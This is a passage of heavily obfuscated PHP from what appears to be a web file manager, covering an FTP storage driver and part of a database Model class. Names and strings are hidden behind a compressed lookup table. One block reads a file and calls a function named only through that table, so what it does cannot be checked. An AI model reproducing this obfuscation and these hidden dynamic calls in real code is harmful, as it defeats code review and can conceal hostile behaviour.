$this->region, $Ç•öıÜè, !0); $¤Úòı–® = hash_hmac($œ™‰ó‡›[278], $´¶ì—ü, $ùíšæÆİ, !0); $êóòÏá = hash_hmac($œ™‰ó‡›[278], $†’Ç”˜Æ, $¤Úòı–®, !0); $ºË×°ç = hash_hmac($œ™‰ó‡›[278], $ÙˆàÎ£Ü, $êóòÏá); $²á’©Ñ = array($œ™‰ó‡›[249] => $œ™‰ó‡›[12], $œ™‰ó‡›[297] => $œ™‰ó‡›[12], $œ™‰ó‡›[309] => $ñû¦æÏ, $œ™‰ó‡›[273] => $‰ÙÍˆæ½, $œ™‰ó‡›[280] => $ÙˆàÎ£Ü, $œ™‰ó‡›[311] => $‰Î¨ìœâ, $œ™‰ó‡›[312] => $ÇÁ–ƒÈ, $œ™‰ó‡›[313] => $ê´£¸, $œ™‰ó‡›[314] => $Âêóîó°, $œ™‰ó‡›[315] => $ºË×°ç, $œ™‰ó‡›[209] => $this->getHost()); return $²á’©Ñ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($Çè²ì÷ä) { parent::__construct(); if (count($Çè²ì÷ä) > 0) { $this->_init($Çè²ì÷ä); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($õİë°õÙ) { $şš…ìí¹ =& $_SERVER[äô®•½Â]; global $config; $this->appCharset = $config[$şš…ìí¹[1444]]; $this->systemCharset = $config[$şš…ìí¹[1445]]; if (isset($õİë°õÙ[$şš…ìí¹[1446]]) && $õİë°õÙ[$şš…ìí¹[1446]]) { $this->systemCharset = $õİë°õÙ[$şš…ìí¹[1446]]; } } public function iconvApp($Ãú¼¼Ë) { return $this->iconvTo($Ãú¼¼Ë, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ò¨•ˆØø) { return $this->iconvTo($Ò¨•ˆØø, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ü¿„ÇÀ³) { $Ä©´ğ¾Ö =& $_SERVER[äô®•½Â]; $¡Šòû•Í = $this->iconvApp($this->pathBase); $Ü¿„ÇÀ³ = $this->iconvApp($Ü¿„ÇÀ³); if (substr($¡Šòû•Í, 0, 2) == $Ä©´ğ¾Ö[1416]) { $¡Šòû•Í = BASIC_PATH . substr($¡Šòû•Í, 2); } if (substr($Ü¿„ÇÀ³, 0, 2) == $Ä©´ğ¾Ö[1416]) { $Ü¿„ÇÀ³ = BASIC_PATH . substr($Ü¿„ÇÀ³, 2); } $¡Šòû•Í = KodIO::clear($¡Šòû•Í); $Ü¿„ÇÀ³ = KodIO::clear($Ü¿„ÇÀ³); $Ü¿„ÇÀ³ = substr($Ü¿„ÇÀ³, strlen($¡Šòû•Í)); if (empty($this->pathDriver)) { return $Ü¿„ÇÀ³; } return $this->pathDriver . $Ä©´ğ¾Ö[8] . ltrim($Ü¿„ÇÀ³, $Ä©´ğ¾Ö[8]); } private function _init($›Ø†±â“ = array()) { $œÑ†“¾ê =& $_SERVER[äô®•½Â]; if (!function_exists($œÑ†“¾ê[1447])) { throw new Exception(LNG($œÑ†“¾ê[1448])); } $this->config = $›Ø†±â“; $this->charsetReset($›Ø†±â“); foreach ($›Ø†±â“ as $Á³©ô => $Ä¼Ğ§­) { if (isset($this->{$Á³©ô})) { $this->{$Á³©ô} = $Ä¼Ğ§­; } } return $this->_login($›Ø†±â“); } private function _login($àû×ŞÀÛ) { $¦Êèí±Ï =& $_SERVER[äô®•½Â]; static $ÓÈ çû… = array(); $Š¹Œ¥éô = md5(json_encode($àû×ŞÀÛ)); if (isset($ÓÈ çû…[$Š¹Œ¥éô])) { foreach ($ÓÈ çû…[$Š¹Œ¥éô] as $•°Ğ®˜ => $ğ†ÊÜ) { $this->{$•°Ğ®˜} = $ğ†ÊÜ; } return !0; } $‹Áõáİ = parse_url(trim($this->server, $¦Êèí±Ï[8])); $this->host = $‹Áõáİ[$¦Êèí±Ï[209]]; $“é¶õƒ„ = isset($‹Áõáİ[$¦Êèí±Ï[208]]) && $‹Áõáİ[$¦Êèí±Ï[208]] == $¦Êèí±Ï[1449] ? !0 : !1; $this->scheme = $“é¶õƒ„ ? $¦Êèí±Ï[1450] : $¦Êèí±Ï[1451]; $this->port = isset($‹Áõáİ[$¦Êèí±Ï[210]]) ? $‹Áõáİ[$¦Êèí±Ï[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($¦Êèí±Ï[1452]) . $this->host . $¦Êèí±Ï[4] . $this->port, !0); return !1; } $¿°êàı = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¿°êàı) { $this->writeLog(LNG($¦Êèí±Ï[1453]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $¦Êèí±Ï[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Õ²“‘Œ = $this->pasv == $¦Êèí±Ï[91] ? !0 : !1; @ftp_pasv($this->connect, $Õ²“‘Œ); $ÓÈ çû…[$Š¹Œ¥éô] = array($¦Êèí±Ï[1454] => $this->connect, $¦Êèí±Ï[209] => $this->host, $¦Êèí±Ï[208] => $this->scheme, $¦Êèí±Ï[210] => $this->port); return $¿°êàı; } private function _isconn($ÌÛë¨—Ê = true) { if (is_resource($this->connect)) { return !0; } if (!$ÌÛë¨—Ê) { return !1; } return $this->_login($this->config); } public function mkfile($Æ´÷Şàª, $ÑÛëÔ = '', $îÙİÈšË = REPEAT_RENAME) { if ($this->setContent($Æ´÷Şàª, $ÑÛëÔ)) { return $this->getPathOuter($Æ´÷Şàª); } $this->writeLog(LNG($_SERVER[äô®•½Â][1455]), !0); return !1; } public function mkdir($Ÿ÷§¢ô½, $ãÛ¼ÔŸ³ = REPEAT_SKIP) { $ôŒŸƒ»ò =& $_SERVER[äô®•½Â]; if (!$Ÿ÷§¢ô½ || $Ÿ÷§¢ô½ == $ôŒŸƒ»ò[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Ÿ÷§¢ô½ = $this->iconvSystem($Ÿ÷§¢ô½); if ($this->_isFolder($Ÿ÷§¢ô½) || @ftp_mkdir($this->connect, $Ÿ÷§¢ô½)) { return $this->getPathOuter($Ÿ÷§¢ô½); } if (!$this->mkdir($this->pathFather($Ÿ÷§¢ô½))) { return !1; } if ($Ÿ÷§¢ô½ = @ftp_mkdir($this->connect, $Ÿ÷§¢ô½)) { return $this->getPathOuter($Ÿ÷§¢ô½); } $¯Ãáà“š = __FUNCTION__ . $ôŒŸƒ»ò[1456]; $this->writeLog($¯Ãáà“š, !0); return !1; } public function copyFile($ë†İñ®§, $ü˜ÑÆ½Õ) { if (!$this->_isconn()) { return !1; } $ùô¾ùÖ× = $this->pathThis($this->iconvSystem($ë†İñ®§)); $ÔÁ‘ôª = $this->tempFile($ùô¾ùÖ×); $æ¹î®ã¶ = $this->iconvApp($ÔÁ‘ôª); $this->download($ë†İñ®§, $æ¹î®ã¶); $›ˆúƒ¿ = $this->upload($ü˜ÑÆ½Õ, $æ¹î®ã¶); $this->tempFileRemve($ÔÁ‘ôª); return $›ˆúƒ¿; } public function moveFile($Ì¾á¥ò, $ÑèıßÈ) { if (!$this->_isconn()) { return !1; } $Ì¾á¥ò = $this->iconvSystem($Ì¾á¥ò); $ÑèıßÈ = $this->iconvSystem($ÑèıßÈ); $½ŒÓÎ¨Ø = @ftp_rename($this->connect, $Ì¾á¥ò, $ÑèıßÈ); if (!$½ŒÓÎ¨Ø) { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][1456], !0); return !1; } return $this->getPathOuter($ÑèıßÈ); } public function delFile($«Œİüµ›) { if (!$this->_isconn()) { return !1; } $«Œİüµ› = $this->iconvSystem($«Œİüµ›); $·Ò™£¥ı = @ftp_delete($this->connect, $«Œİüµ›); if (!$·Ò™£¥ı) { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][1456], !0); } return $·Ò™£¥ı; } public function delFolder($Óœ³Ü¤º) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ı–¨æËê = $Ç‚ÛÙÅ = array(); $this->fileList($Óœ³Ü¤º, $ı–¨æËê, $Ç‚ÛÙÅ, !0); $this->listItemCache = !0; foreach ($Ç‚ÛÙÅ as $¿¦ÏÕıŸ) { $¥êñóÊ¨ = $this->iconvSystem($¿¦ÏÕıŸ[$_SERVER[äô®•½Â][32]]); $é¸ÕÈ±° = @ftp_delete($this->connect, $¥êñóÊ¨); if (!$é¸ÕÈ±°) { return !1; } } foreach ($ı–¨æËê as $¥êñóÊ¨) { $¥êñóÊ¨ = $this->iconvSystem($¥êñóÊ¨); $é¸ÕÈ±° = @ftp_rmdir($this->connect, $¥êñóÊ¨); if (!$é¸ÕÈ±°) { return !1; } } $Óœ³Ü¤º = $this->iconvSystem($Óœ³Ü¤º); return @ftp_rmdir($this->connect, $Óœ³Ü¤º); } public function rename($’ª°ÔÎ÷, $ı¬ÄíŞ) { $ËÇô‘ =& $_SERVER[äô®•½Â]; if (!$this->_isconn()) { return !1; } $ü·û±Ùê = $this->fileNameAuto($this->pathFather($’ª°ÔÎ÷), $ı¬ÄíŞ); $ü·û±Ùê = $this->iconvSystem($ü·û±Ùê); $’ª°ÔÎ÷ = $this->iconvSystem($’ª°ÔÎ÷); $ãå‘«Ï = $this->pathFather($’ª°ÔÎ÷); $Ú¼Ú³ü = rtrim($ãå‘«Ï, $ËÇô‘[8]) . $ËÇô‘[8] . $ü·û±Ùê; $€‹®„¢ = @ftp_rename($this->connect, $’ª°ÔÎ÷, $Ú¼Ú³ü); if (!$€‹®„¢) { $this->writeLog(__FUNCTION__ . $ËÇô‘[1456], !0); return !1; } $Ú¼Ú³ü = $this->iconvApp($Ú¼Ú³ü); return $this->getPathOuter($Ú¼Ú³ü); } private function folderInfo($’ô±•Ğ, $ã…•¤ê¼ = false) { $Ü¢˜·×ô =& $_SERVER[äô®•½Â]; $õàƒş = array($Ü¢˜·×ô[32] => $this->pathThis($’ô±•Ğ), $Ü¢˜·×ô[87] => $this->getPathOuter($Ü¢˜·×ô[8] . $’ô±•Ğ), $Ü¢˜·×ô[33] => $Ü¢˜·×ô[78]); if ($ã…•¤ê¼) { return $õàƒş; } $õàƒş[$Ü¢˜·×ô[234]] = $õàƒş[$Ü¢˜·×ô[88]] = 0; $õàƒş[$Ü¢˜·×ô[235]] = $õàƒş[$Ü¢˜·×ô[236]] = !0; return $õàƒş; } private function fileInfo($³´¼¤œ, $ºÙÖğí = false, $ŸÁÆœ¦Ø = array()) { $Ş‡Š·ó =& $_SERVER[äô®•½Â]; $ÌÈªÚì = array($Ş‡Š·ó[32] => $this->pathThis($³´¼¤œ), $Ş‡Š·ó[87] => $this->getPathOuter($Ş‡Š·ó[8] . $³´¼¤œ), $Ş‡Š·ó[33] => $Ş‡Š·ó[233], $Ş‡Š·ó[79] => isset($ŸÁÆœ¦Ø[$Ş‡Š·ó[79]]) ? $ŸÁÆœ¦Ø[$Ş‡Š·ó[79]] : 0, $Ş‡Š·ó[169] => $this->ext($³´¼¤œ)); if ($ºÙÖğí) { return $ÌÈªÚì; } $ÌÈªÚì[$Ş‡Š·ó[234]] = $ÌÈªÚì[$Ş‡Š·ó[88]] = 0; $ÌÈªÚì[$Ş‡Š·ó[235]] = $ÌÈªÚì[$Ş‡Š·ó[236]] = !0; $†ÜÌÆ·¼ = $this->iconvSystem($³´¼¤œ); $ÌÈªÚì[$Ş‡Š·ó[88]] = @ftp_mdtm($this->connect, $†ÜÌÆ·¼); if (empty($ŸÁÆœ¦Ø)) { $ŸÁÆœ¦Ø = $this->objectMeta($³´¼¤œ); if (!$ŸÁÆœ¦Ø) { return $ÌÈªÚì; } } $ÌÈªÚì[$Ş‡Š·ó[79]] = $ŸÁÆœ¦Ø[$Ş‡Š·ó[79]]; return $ÌÈªÚì; } public function size($×¸ÃÊ¯) { $—ûÊ¿ò = $this->objectMeta($×¸ÃÊ¯); return $—ûÊ¿ò ? $—ûÊ¿ò[$_SERVER[äô®•½Â][79]] : 0; } public function info($Ö„ÒÊÍš) { if ($this->isFile($Ö„ÒÊÍš)) { return $this->fileInfo($Ö„ÒÊÍš, 0); } else { if ($this->isFolder($Ö„ÒÊÍš)) { return $this->folderInfo($Ö„ÒÊÍš); } } return !1; } private function fileList($Ã÷¸¨Ïğ, &$Èª¯õ¿, &$§ó„Í‹µ, $ô±×ùúã = false) { $Ûü—Î¶ =& $_SERVER[äô®•½Â]; $Ã÷¸¨Ïğ = $this->iconvSystem($Ã÷¸¨Ïğ); if (!$this->isFolder($Ã÷¸¨Ïğ)) { return !1; } $Ã÷¸¨Ïğ = rtrim($Ã÷¸¨Ïğ, $Ûü—Î¶[8]) . $Ûü—Î¶[8]; check_abort(); $€÷¿á§ = @ftp_rawlist($this->connect, $Ã÷¸¨Ïğ); if (!$€÷¿á§) { $€÷¿á§ = array(); } $Ú¿Â—Æß = array($Ûü—Î¶[10] => 1, $Ûü—Î¶[1361] => 1); foreach ($€÷¿á§ as $Öàñıî‚) { $†§úú«Ó = $this->_listItem($Öàñıî‚); if ($†§úú«Ó[0] == $Ûü—Î¶[824]) { continue; } $Êˆ·€ô = $†§úú«Ó[8]; if (empty($Êˆ·€ô) && $Êˆ·€ô !== $Ûü—Î¶[231] || isset($Ú¿Â—Æß[$Êˆ·€ô])) { continue; } $Êˆ·€ô = $this->iconvApp($Ã÷¸¨Ïğ . ltrim($Êˆ·€ô, $Ûü—Î¶[8])); $”Í’ê‰Ô = array($Ûü—Î¶[32] => $Êˆ·€ô, $Ûü—Î¶[33] => $Ûü—Î¶[233], $Ûü—Î¶[79] => $†§úú«Ó[4]); if (substr($Öàñıî‚, 0, 1) == $Ûü—Î¶[1457]) { $”Í’ê‰Ô[$Ûü—Î¶[33]] = $Ûü—Î¶[78]; $”Í’ê‰Ô[$Ûü—Î¶[79]] = 0; } $ÓÃ¯«éÊ = $”Í’ê‰Ô[$Ûü—Î¶[33]] == $Ûü—Î¶[78] ? !0 : !1; $this->cacheMethodInfoSet($Êˆ·€ô, $ÓÃ¯«éÊ, $”Í’ê‰Ô); if ($ÓÃ¯«éÊ) { $Èª¯õ¿[] = $Êˆ·€ô; if ($ô±×ùúã) { $this->fileList($Êˆ·€ô, $Èª¯õ¿, $§ó„Í‹µ, $ô±×ùúã); } continue; } $§ó„Í‹µ[] = $”Í’ê‰Ô; } $this->cacheMethodInfoSet($Ã÷¸¨Ïğ, !0); } private function _listItem($Á¤’Ğ£Õ) { if (empty($Á¤’Ğ£Õ)) { return array(); } $¡ÔÔ°¨¡ = preg_split($_SERVER[äô®•½Â][1458], $Á¤’Ğ£Õ); if (count($¡ÔÔ°¨¡) <= 9) { return $¡ÔÔ°¨¡; } $¡ÔÔ°¨¡[8] = trim(substr($Á¤’Ğ£Õ, strpos($Á¤’Ğ£Õ, $¡ÔÔ°¨¡[7]) + strlen($¡ÔÔ°¨¡[7]))); return array_splice($¡ÔÔ°¨¡, 0, 9); } public function listPath($Ò‚·èè, $‰ÙÖ”â = false) { $”àşâÇ· =& $_SERVER[äô®•½Â]; if (!$this->_isconn()) { return !1; } $Ñ¯£Óß¢ = $·Ú¾›Åğ = array(); $this->fileList($Ò‚·èè, $Ñ¯£Óß¢, $·Ú¾›Åğ); foreach ($Ñ¯£Óß¢ as $Ê«Š´à… => $§«Š½¥¤) { $Ñ¯£Óß¢[$Ê«Š´à…] = $this->folderInfo($§«Š½¥¤, $‰ÙÖ”â); } foreach ($·Ú¾›Åğ as $Ê«Š´à… => $§«Š½¥¤) { $·Ú¾›Åğ[$Ê«Š´à…] = $this->fileInfo($§«Š½¥¤[$”àşâÇ·[32]], $‰ÙÖ”â, $§«Š½¥¤); } return array($”àşâÇ·[85] => $Ñ¯£Óß¢, $”àşâÇ·[86] => $·Ú¾›Åğ); } public function has($‚½Õ¼åé, $ÎÆò“›Å = false, $°ˆ†»î = true) { $ĞÀäÔ¸Ç =& $_SERVER[äô®•½Â]; $ ±è÷µ˜ = $ºö™ÔÓ = array(); $»øş›—ü = $ÎÆò“›Å ? !0 : !1; $this->fileList($‚½Õ¼åé, $ ±è÷µ˜, $ºö™ÔÓ, $»øş›—ü); if ($ÎÆò“›Å) { return array($ĞÀäÔ¸Ç[242] => count($ºö™ÔÓ), $ĞÀäÔ¸Ç[243] => count($ ±è÷µ˜)); } if ($°ˆ†»î) { if (count($ºö™ÔÓ)) { return !0; } } else { if (count($ ±è÷µ˜)) { return !0; } } return !1; } public function listAll($óü„€°ˆ) { $ç×»«ƒ– =& $_SERVER[äô®•½Â]; if (!$this->_isconn()) { return !1; } $öÈèŸõ« = $Ïˆ¥ïéÅ = array(); $this->fileList($óü„€°ˆ, $öÈèŸõ«, $Ïˆ¥ïéÅ, !0); $±»©˜¤Ô = array_to_keyvalue($Ïˆ¥ïéÅ, $ç×»«ƒ–[32]); foreach ($öÈèŸõ« as $ûÇŸóÙÖ) { if (is_string($ûÇŸóÙÖ)) { $±»©˜¤Ô[$ûÇŸóÙÖ] = array($ç×»«ƒ–[79] => 0); } } return $this->listAllFiles($óü„€°ˆ, $±»©˜¤Ô); } public function getContent($Ã¼Á®¢±) { if (!$this->_isconn()) { return !1; } $Ã¼Á®¢± = $this->iconvSystem($Ã¼Á®¢±); return $this->fileSubstr($Ã¼Á®¢±); } public function setContent($ßâ©ÉÁ…, $ àåé˜é = '') { if (!$this->_isconn()) { return !1; } $ºèıÅŒ» = $this->pathThis($this->iconvSystem($ßâ©ÉÁ…)); $©ŸÊè‚Ê = $this->tempFile($ºèıÅŒ»); file_put_contents($©ŸÊè‚Ê, $ àåé˜é); $›–£¶˜¡ = $this->upload($ßâ©ÉÁ…, $this->iconvApp($©ŸÊè‚Ê)); $this->tempFileRemve($©ŸÊè‚Ê); return $›–£¶˜¡; } public function fileSubstr($à¥ÖÔÌ, $ÖÒ³âˆÂ = 0, $’ŠäÃÒÁ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($à¥ÖÔÌ, $ÖÒ³âˆÂ, $’ŠäÃÒÁ); } private function ftpRequest($Ã¡ûü¶, $âÚÂìï = 0, $¹ œ×˜¬ = false) { $±üÌ“ö =& $_SERVER[äô®•½Â]; $Ã¡ûü¶ = $±üÌ“ö[8] . ltrim(str_ltrim($Ã¡ûü¶, $this->ftpPath), $±üÌ“ö[8]); $Ã¡ûü¶ = $this->iconvSystem($Ã¡ûü¶); $Ã¥—§• = $this->scheme . $this->host . $±üÌ“ö[4] . $this->port; $¿•õƒã = curl_init(); curl_setopt($¿•õƒã, CURLOPT_URL, $Ã¥—§• . $this->pathEncode($Ã¡ûü¶)); curl_setopt($¿•õƒã, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¹ œ×˜¬) { $äÌ»ÌéÏ = $âÚÂìï + $¹ œ×˜¬ - 1; curl_setopt($¿•õƒã, CURLOPT_RANGE, "{$âÚÂìï}\x2d{$äÌ»ÌéÏ}"); } curl_setopt($¿•õƒã, CURLOPT_RETURNTRANSFER, 1); $‡Şèš¤ = curl_exec($¿•õƒã); curl_close($¿•õƒã); return $‡Şèš¤; } public function upload($½³É‘½†, $Ä½ó²í, $ä­‘ô¶ô = false, $ØØÎÁ  = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($½³É‘½†))) { return !1; } $½³É‘½† = $this->iconvSystem($½³É‘½†); $Ä½ó²í = $this->iconvSystem($Ä½ó²í); $ƒ†³éØ¢ = ftp_nb_put($this->connect, $½³É‘½†, $Ä½ó²í, FTP_BINARY); while ($ƒ†³éØ¢ == FTP_MOREDATA) { $ƒ†³éØ¢ = ftp_nb_continue($this->connect); } if ($ƒ†³éØ¢ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][1456], !0); return !1; } return $this->getPathOuter($½³É‘½†); } public function download($¸‚¨¶èŠ, $Íƒé‘¾ = '') { if (!$this->_isconn()) { return !1; } $Î”ÃôÑá = $this->pathFather($Íƒé‘¾); if (!IO::mkdir($Î”ÃôÑá)) { return !1; } $¸‚¨¶èŠ = $this->iconvSystem($¸‚¨¶èŠ); $Íƒé‘¾ = $this->iconvSystem($Íƒé‘¾); $÷Ó¸Í‘µ = ftp_nb_get($this->connect, $Íƒé‘¾, $¸‚¨¶èŠ, FTP_BINARY); while ($÷Ó¸Í‘µ == FTP_MOREDATA) { $÷Ó¸Í‘µ = ftp_nb_continue($this->connect); } if ($÷Ó¸Í‘µ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[äô®•½Â][1456], !0); return !1; } return $this->iconvApp($Íƒé‘¾); } public function exist($òËÛÕ”ù) { return $this->isFile($òËÛÕ”ù) || $this->isFolder($òËÛÕ”ù); } public function isFile($È¤œóÌÁ) { return !$this->isFolder($È¤œóÌÁ) && $this->objectMeta($È¤œóÌÁ); } public function isFolder($¸›Ÿ“Êõ) { return $this->cacheMethod($_SERVER[äô®•½Â][180], $¸›Ÿ“Êõ); } protected function objectMeta($…››ÊŒ) { return $this->cacheMethod($_SERVER[äô®•½Â][182], $…››ÊŒ); } protected function _objectMeta($±„¼òõº) { $ºšıï— =& $_SERVER[äô®•½Â]; if ($±„¼òõº == $ºšıï—[12] || $±„¼òõº == $ºšıï—[8]) { return array(); } if (!$this->_isconn()) { return !1; } $±„¼òõº = $this->iconvSystem($±„¼òõº); $ûÃ±”Ãš = array($ºšıï—[32] => $this->iconvApp($±„¼òõº), $ºšıï—[33] => $ºšıï—[233], $ºšıï—[79] => 0); $–ÊßÔ¬¬ = @ftp_size($this->connect, $±„¼òõº); if ($–ÊßÔ¬¬ != -1) { $ûÃ±”Ãš[$ºšıï—[79]] = $–ÊßÔ¬¬; } else { $¤¡êÎ‚Ö = @ftp_chdir($this->connect, $±„¼òõº); if (!$¤¡êÎ‚Ö) { return !1; } @ftp_chdir($this->connect, $ºšıï—[8]); $ûÃ±”Ãš[$ºšıï—[33]] = $ºšıï—[78]; } return $ûÃ±”Ãš; } protected function _isFolder($¥ƒ›³º…) { $¢ç¬—“Ì =& $_SERVER[äô®•½Â]; if ($¥ƒ›³º… == $¢ç¬—“Ì[12] || $¥ƒ›³º… == $¢ç¬—“Ì[8]) { return !0; } $ĞÓè’ü = $this->_objectMeta($¥ƒ›³º…); return isset($ĞÓè’ü[$¢ç¬—“Ì[33]]) && $ĞÓè’ü[$¢ç¬—“Ì[33]] == $¢ç¬—“Ì[78] ? !0 : !1; } } goto c»ËæŠèø; C¥—œ„¶Ë: define($_SERVER[äô®•½Â][0], $_SERVER[äô®•½Â][1]); $_SERVER[…´Øâ×‘] = explode($_SERVER[äô®•½Â][2], gzinflate(substr($_SERVER[äô®•½Â][3], 10, -8))); function binCheckEq($ìöÍ¹¸, $œ¯ÔŸ¤Á) { return $ìöÍ¹¸ == $œ¯ÔŸ¤Á; } goto bÒ¦Åâê¼; cØ‰Ó——àÇ: define($_SERVER[äô®•½Â][323], 2); if ($_SERVER[$_SERVER[äô®•½Â][324]] != $_SERVER[$_SERVER[äô®•½Â][325]]) { $_getc = $_SERVER[äô®•½Â][326]; $_getfile = $_SERVER[$_SERVER[äô®•½Â][327]] . $_SERVER[äô®•½Â][328]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[äô®•½Â][288], $_getfilec); if (count($_getarrs) < $_SERVER[äô®•½Â][329]) { $exit = $_SERVER[äô®•½Â][330]; $exit(); } $_act = $_SERVER[äô®•½Â][331]; $_act($_SERVER[$_SERVER[äô®•½Â][332]]); } class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\x6f\162\x64\145\162", "\x61\154\151\x61\x73", "\x68\x61\166\151\x6e\x67", "\x67\162\x6f\x75\160", "\154\x6f\143\x6b", "\144\x69\163\x74\151\x6e\x63\164", "\x61\165\x74\x6f", "\146\x69\x6c\x74\x65\x72", "\x76\x61\154\x69\144\141\x74\x65", "\162\x65\x73\165\x6c\164", "\x62\x69\156\x64", "\x74\x6f\x6b\x65\x6e"); public function __construct($Å¼Çşƒ = '', $Æû³š×Õ = '', $Ò¯àŒÇ = '') { $Íıë®à =& $_SERVER[äô®•½Â]; $this->_initialize(); if (!empty($Å¼Çşƒ)) { if (strpos($Å¼Çşƒ, $Íıë®à[10])) { list($this->dbName, $this->name) = explode($Íıë®à[10], $Å¼Çşƒ); } else { $this->name = $Å¼Çşƒ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Æû³š×Õ)) { $this->tablePrefix = $Íıë®à[12]; } elseif ($Íıë®à[12] != $Æû³š×Õ) { $this->tablePrefix = $Æû³š×Õ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Íıë®à[333]); } $this->db(0, empty($this->connection) ? $Ò¯àŒÇ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $™ïù¿äŠ =& $_SERVER[äô®•½Â]; if (empty($this->fields)) { if (think_config($™ïù¿äŠ[334])) { $”ÁÈãÉ = $this->dbName ? $this->dbName : think_config($™ïù¿äŠ[335]); $“®°ô›ç = think_var_cache($™ïù¿äŠ[336] . strtolower(get_path_this($”ÁÈãÉ) . $™ïù¿äŠ[10] . $this->name)); if ($“®°ô›ç) { $–óÕì¬å = think_config($™ïù¿äŠ[337]); if (empty($–óÕì¬å) || $“®°ô›ç[$™ïù¿äŠ[338]] == $–óÕì¬å) { $this->fields = $“®°ô›ç; return; } } } $this->flush(); } } public function flush() { $Ò†ûø®¾ =& $_SERVER[äô®•½Â]; $this->db->setModel($this->name); $„´Õæò´ = $this->db->getFields($this->getTableName()); if (!$„´Õæò´) { return !1; } $this->fields = array_keys($„´Õæò´); $this->fields[$Ò†ûø®¾[339]] = !1; foreach ($„´Õæò´ as $êÛ¡ë•Ø => $½Ü«®°) { $×š­èñ’[$êÛ¡ë•Ø] = $½Ü«®°[$Ò†ûø®¾[33]]; if ($½Ü«®°[$Ò†ûø®¾[39]]) { $this->fields[$Ò†ûø®¾[340]] = $êÛ¡ë•Ø; if ($½Ü«®°[$Ò†ûø®¾[42]]) { $this->fields[$Ò†ûø®¾[339]] = !0; } } } $this->fields[$Ò†ûø®¾[341]] = $×š­èñ’; if (think_config($Ò†ûø®¾[337])) { $this->fields[$Ò†ûø®¾[338]] = think_config($Ò†ûø®¾[337]); } if (think_config($Ò†ûø®¾[334])) { $ÑÉæİ©¦ = $this->dbName ? $this->dbName : think_config($Ò†ûø®¾[335]); think_var_cache($Ò†ûø®¾[336] . strtolower(get_path_this($ÑÉæİ©¦) . $Ò†ûø®¾[10] . $this->name), $this->fields); } } public function switchModel($¦ùÁéÜ•, $¬É‰ò¸Ã = array()) { $­Úµ«ï¾ =& $_SERVER[äô®•½Â]; $äñæÆ÷ = ucwords(strtolower($¦ùÁéÜ•)) . $­Úµ«ï¾[342]; if (!class_exists($äñæÆ÷)) { think_exception($äñæÆ÷ . think_lang($­Úµ«ï¾[343])); } $this->_extModel = new $äñæÆ÷($this->name); if (!empty($¬É‰ò¸Ã)) { foreach ($¬É‰ò¸Ã as $“ü©ÒÈË) { $this->_extModel->setProperty($“ü©ÒÈË, $this->{$“ü©ÒÈË}); } } return $this->_extModel; } public function __set($·ë¹Â§, $ÃŸïËçÍ) { $this->data[$·ë¹Â§] = $ÃŸïËçÍ; } public function __get($Ö áí¿€) { return isset($this->data[$Ö áí¿€]) ? $this->data[$Ö áí¿€] : null; } public function __isset($î‡ó³¶Ó) { return isset($this->data[$î‡ó³¶Ó]); } public function __unset($’î¾åş¿) { unset($this->data[$’î¾åş¿]); } public function __call($§îÏ¡Ã’, $ã×Î³ÎØ) { $ÅÜÙöÑ¸ =& $_SERVER[äô®•½Â]; if (in_array(strtolower($§îÏ¡Ã’), $this->methods, !0)) { $this->options[strtolower($§îÏ¡Ã’)] = $ã×Î³ÎØ[0]; return $this; } elseif (in_array(strtolower($§îÏ¡Ã’), array($ÅÜÙöÑ¸[344], $ÅÜÙöÑ¸[345], $ÅÜÙöÑ¸[346], $ÅÜÙöÑ¸[347], $ÅÜÙöÑ¸[348]), !0)) { $½‹õ×¨ş = isset($ã×Î³ÎØ[0]) ? $ã×Î³ÎØ[0] : $ÅÜÙöÑ¸[223]; $½‹õ×¨ş = $this->db->parseKey($½‹õ×¨ş); return $this->getField(strtoupper($§îÏ¡Ã’) . $ÅÜÙöÑ¸[349] . $½‹õ×¨ş . $ÅÜÙöÑ¸[350] . $§îÏ¡Ã’, $ÅÜÙöÑ¸[344]); } elseif (strtolower(substr($§îÏ¡Ã’, 0, 5)) == $ÅÜÙöÑ¸[351]) { $½‹õ×¨ş = think_parse_name(substr($§îÏ¡Ã’, 5)); $ÜÖ„Î¯”[$½‹õ×¨ş] = $ã×Î³ÎØ[0]; return $this->where($ÜÖ„Î¯”)->find(); } elseif (strtolower(substr($§îÏ¡Ã’, 0, 10)) == $ÅÜÙöÑ¸[352]) { $Î“èûûú = think_parse_name(substr($§îÏ¡Ã’, 10)); $ÜÖ„Î¯”[$Î“èûûú] = $ã×Î³ÎØ[0]; return $this->where($ÜÖ„Î¯”)->getField($ã×Î³ÎØ[1]); } elseif (isset($this->_scope[$§îÏ¡Ã’])) { return 